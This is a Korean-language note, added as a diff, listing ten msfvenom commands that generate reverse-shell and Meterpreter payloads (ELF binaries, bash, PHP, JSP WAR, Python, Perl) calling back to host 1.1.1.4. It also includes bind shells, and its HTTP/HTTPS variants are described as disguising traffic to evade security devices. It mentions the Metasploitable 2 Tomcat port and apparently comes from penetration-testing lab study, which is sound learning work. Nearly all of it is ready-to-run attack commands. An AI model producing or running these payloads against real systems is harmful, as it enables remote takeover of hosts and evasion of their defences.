@@ -1,0 +1,65 @@
+msfvenom payload 쓸만한 거 10가지 정리
+
+1. 시스템 직접 타격 (Binary & Command)
+1. linux/x86/meterpreter/reverse_tcp (표준형)
+
+가장 기본적인 리눅스 32비트용 미터프리터 페이로드입니다.
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.1.1.4 LPORT=4444 -f elf -o binary_zombie.elf
+
+2. linux/x86/shell_reverse_tcp (안정형 - Non-staged)
+
+'/' 대신 '_'를 사용한 단일 페이로드로, 네트워크가 불안정할 때 스테이저(Stager) 오류 없이 더 안정적으로 연결됩니다.
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=1.1.1.4 LPORT=4444 -f elf -o stable.elf
+
+3. cmd/unix/reverse_bash (명령어 기반)
+
+별도의 바이너리 파일 없이 명령줄 한 줄로 실행 가능한 페이로드입니다.
+
+msfvenom -p cmd/unix/reverse_bash LHOST=1.1.1.4 LPORT=4448 -f raw -o shell.sh
+
+2. 웹 및 애플리케이션 공략 (Web & Java)
+4. php/meterpreter_reverse_tcp (웹 서버 타겟)
+
+PHP가 구동되는 웹 서버(Apache 등)에 업로드하여 세션을 맺습니다.
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=1.1.1.4 LPORT=4445 -f raw -o web_zombie.php
+
+5. java/jsp_shell_reverse_tcp (Tomcat/ERP 타겟)
+
+MSF2의 8180 포트(Tomcat) 같은 자바 기반 애플리케이션을 공략할 때 유용합니다.
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.1.1.4 LPORT=4447 -f war -o app_zombie.war
+
+3. 탐지 우회 및 특수 상황 (Evasion & Network)
+6. linux/x86/meterpreter/reverse_http (웹 트래픽 위장)
+
+일반적인 4444 포트가 아닌 80번 포트를 사용하여 정상적인 웹 통신처럼 보이게 만듭니다.
+
+msfvenom -p linux/x86/meterpreter/reverse_http LHOST=1.1.1.4 LPORT=80 -f elf -o http_zombie.elf
+
+7. linux/x86/meterpreter/reverse_https (암호화 위장)
+
+HTTPS(443) 통신을 사용하여 패킷 내용을 암호화하고 보안 장비의 탐지를 피합니다.
+
+msfvenom -p linux/x86/meterpreter/reverse_https LHOST=1.1.1.4 LPORT=443 -f elf -o secure.elf
+
+8. linux/x86/meterpreter/bind_tcp (방화벽 우회)
+
+타겟이 외부로 신호를 못 보낼 때, 내가 타겟의 포트에 직접 접속하는 방식입니다.
+
+msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=5555 -f elf -o bind_zombie.elf
+
+4. 스크립트 환경 활용 (Scripting)
+9. python/meterpreter/reverse_tcp (스크립트 좀비)
+
+파이썬 런타임에서 동작하여 OS 독립적인 제어권을 얻습니다.
+
+msfvenom -p python/meterpreter/reverse_tcp LHOST=1.1.1.4 LPORT=4446 -f raw -o script.py
+
+10. cmd/unix/reverse_perl (대체 스크립트)
+
+파이썬이 없을 때 리눅스에 기본 설치된 펄(Perl)을 활용하는 우회 경로입니다.
+
+msfvenom -p cmd/unix/reverse_perl LHOST=1.1.1.4 LPORT=4449 -f raw -o perl_zombie.pl
